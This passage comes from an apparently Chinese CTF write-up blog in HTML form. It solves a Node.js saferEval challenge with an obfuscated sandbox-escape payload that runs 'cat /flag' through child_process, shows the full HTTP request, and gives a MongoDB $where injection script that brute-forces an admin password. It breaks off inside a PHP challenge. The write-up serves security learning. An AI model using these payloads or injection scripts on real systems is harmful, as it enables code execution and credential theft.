class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).<span class="property">keys</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saferEval</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (str.<span class="title function_">replace</span>(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.html&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">results</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> template.<span class="title function_">replace</span>(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.<span class="title function_">join</span>(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieSession</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>);</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Math</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.<span class="property">session</span>.<span class="property">results</span> || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.<span class="property">length</span> === second.<span class="property">length</span> &amp;&amp; first!==second &amp;&amp; <span class="title function_">md5</span>(first+keys[<span class="number">0</span>]) === <span class="title function_">md5</span>(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">e</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = <span class="title function_">saferEval</span>(req.<span class="property">body</span>.<span class="property">e</span>) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">        result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.<span class="title function_">unshift</span>(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.<span class="title function_">unshift</span>(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.<span class="property">length</span> &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.<span class="title function_">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">results</span> = results;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title function_">render</span>(req.<span class="property">session</span>.<span class="property">results</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">admin</span> = req.<span class="property">session</span>.<span class="property">admin</span> || <span class="number">0</span>;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title function_">render</span>(req.<span class="property">session</span>.<span class="property">results</span> = req.<span class="property">session</span>.<span class="property">results</span> || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>首先是一个弱类型比较，这个用<code>1、[1]</code>这种数组就可以绕过了，重点是那一段正则匹配<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683468579089-335b490b-b866-4f23-b7ab-50a8c410c129.png#averageHue=%236490a8&clientId=u89b7bba3-826c-4&from=paste&height=445&id=uaf1eb755&originHeight=445&originWidth=1229&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59646&status=done&style=none&taskId=u6a202fd0-4a21-44ca-8162-d12b741d9b0&title=&width=1229" alt="image.png"><br>这样就明朗了许多，也就是<code>Math.xxxx</code>这种形式，这里直接给exp</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span>(</span><br><span class="line">    <span class="title class_">Math</span>=<span class="title class_">Math</span>.<span class="property">constructor</span>,</span><br><span class="line">    <span class="title class_">Math</span>.<span class="property">x</span>=<span class="title class_">Math</span>.<span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        <span class="built_in">Math</span>.fromCharCode(</span></span><br><span class="line"><span class="params"><span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">77</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">117</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">46</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">83</span>,<span class="number">121</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">41</span>)</span></span><br><span class="line"><span class="params">        </span>)(<span class="params"></span>)))(<span class="title class_">Math</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>数字生成用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">payload = <span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;(&quot;</span>+<span class="string">&quot;,&quot;</span>.join([<span class="built_in">str</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> payload])+<span class="string">&quot;)&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ecd97391-627d-458c-a782-34218c3f7213.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 415</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://ecd97391-627d-458c-a782-34218c3f7213.node4.buuoj.cn:81</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://ecd97391-627d-458c-a782-34218c3f7213.node4.buuoj.cn:81/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSION=eyJhZG1pbiI6MCwicmVzdWx0cyI6W119; PHPSESSION.sig=SFo70cx65cwKyPASinpRUu_QwA0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;e&quot;:&quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41,46,116,111,83,116,114,105,110,103,40,41))()))(Math+1)&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[&quot;1&quot;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2021祥云杯-Package-Manager-2021"><a href="#2021祥云杯-Package-Manager-2021" class="headerlink" title="[2021祥云杯]Package Manager 2021"></a>[2021祥云杯]Package Manager 2021</h1><p>考点：Mongodb注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">        burp0_url = <span class="string">&quot;http://4b183de9-b110-4c03-a5d0-bac9afc1fe3c.node4.buuoj.cn:81/auth&quot;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;s%3ANEYdZMIlS_E9xWz2Aj_XJ3EzDD3JY87L.cgc%2B05OM1TqfGZ%2BshhJFiGgJMUuCjZ4EnOPp89RNI%2FQ&quot;</span>&#125;</span><br><span class="line">        burp0_data = &#123;<span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;rxKdo1zr-vnheyATy42CNuyQWNX8ppI1AMS4&quot;</span>, <span class="string">&quot;token&quot;</span>: <span class="string">&quot;202cb962ac59075b964b07152d234b70\&quot;||this.password[&#123;&#125;]==\&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i,j)&#125;</span><br><span class="line">        <span class="built_in">print</span>(burp0_data)</span><br><span class="line">        res=requests.post(burp0_url, cookies=burp0_cookies, data=burp0_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">            passwd += j</span><br><span class="line">            <span class="built_in">print</span>(passwd)</span><br></pre></td></tr></table></figure>
<p>脚本如上。<br>注入点就在auth路由</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> *  <span class="keyword">as</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">User</span> &#125; <span class="keyword">from</span> <span class="string">&quot;../schema&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; checkmd5Regex &#125; <span class="keyword">from</span> <span class="string">&quot;../utils&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">		<span class="keyword">if</span> (username == <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> (username) !== <span class="string">&quot;string&quot;</span> || password == <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> (password) !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error&#x27;</span> &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">const</span> user = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="string">&quot;username&quot;</span>: username &#125;)</span><br><span class="line">		<span class="keyword">if</span> (!user || !(user.<span class="property">password</span> === password)) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid username or password&#x27;</span> &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		req.<span class="property">session</span>.<span class="property">userId</span> = user.<span class="property">id</span></span><br><span class="line">		res.<span class="title function_">redirect</span>(<span class="string">&#x27;/packages/list&#x27;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters cannot be blank&#x27;</span> &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; username, password, password2 &#125; = req.<span class="property">body</span>;</span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password &amp;&amp; password2) &#123;</span><br><span class="line">		<span class="keyword">if</span> (username == <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> (username) !== <span class="string">&quot;string&quot;</span> || password == <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> (password) !== <span class="string">&quot;string&quot;</span> || password2 == <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> (password2) !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error&#x27;</span> &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (password != password2) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Password do noy match&#x27;</span> &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">username</span>: username &#125;)) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Username already taken&#x27;</span> &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">const</span> user = <span class="keyword">new</span> <span class="title class_">User</span>(&#123; <span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;isAdmin&quot;</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">			<span class="keyword">await</span> user.<span class="title function_">save</span>()</span><br><span class="line">		&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: err &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters cannot be blank&#x27;</span> &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	req.<span class="property">session</span>.<span class="title function_">destroy</span>(<span class="function">() =&gt;</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/auth&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>))</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/auth&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; token &#125; = req.<span class="property">body</span>;</span><br><span class="line">	<span class="keyword">if</span> (token !== <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> (token) === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_">checkmd5Regex</span>(token)) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="keyword">let</span> docs = <span class="keyword">await</span> <span class="title class_">User</span>.$where(<span class="string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="subst">$&#123;token.toString()&#125;</span>&quot;`</span>).<span class="title function_">exec</span>()</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(docs);</span><br><span class="line">				<span class="keyword">if</span> (docs.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (!(docs[<span class="number">0</span>].<span class="property">isAdmin</span> === <span class="literal">true</span>)) &#123;</span><br><span class="line">						<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Failed to auth&#x27;</span> &#125;)</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;No matching results&#x27;</span> &#125;)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">				<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: err &#125;)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Token must be valid md5 string&#x27;</span> &#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error&#x27;</span> &#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	req.<span class="property">session</span>.<span class="property">AccessGranted</span> = <span class="literal">true</span></span><br><span class="line">	res.<span class="title function_">redirect</span>(<span class="string">&#x27;/packages/submit&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br></pre></td></tr></table></figure>
<p>可以看到auth处存在<code>$&#123;&#125;</code>字符串拼贴，可以得到管理员admin密码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683817520202-b6fb334f-a342-4e0c-861e-344966656a00.png#averageHue=%23fefefe&clientId=u4808d9c6-0785-4&from=paste&height=342&id=ucd6c6f86&originHeight=427&originWidth=1733&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24549&status=done&style=none&taskId=u1be9ea6c-ee91-44a8-b78f-62f8daf7f4d&title=&width=1386.4" alt="image.png"></p>
<h1 id="蓝帽杯-2021-One-Pointer-PHP"><a href="#蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="[蓝帽杯 2021]One Pointer PHP"></a>[蓝帽杯 2021]One Pointer PHP</h1><p>考点：数组整形溢出、FTP被动模式攻击PHP-FPM、绕过disabled_function、绕过open_basedir</p>
<p>这一题知识点好多。尤其是FTP的被动模式攻击，这个在前几年是很流行的一个考点，但无奈入门比较晚，现在才接触。。。。anyway现在来学<br>复现完了后发现完全不需要FTP啊。。。用UserFilter就可以绕过了。不过算了，直接当做一个练习的机会！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span 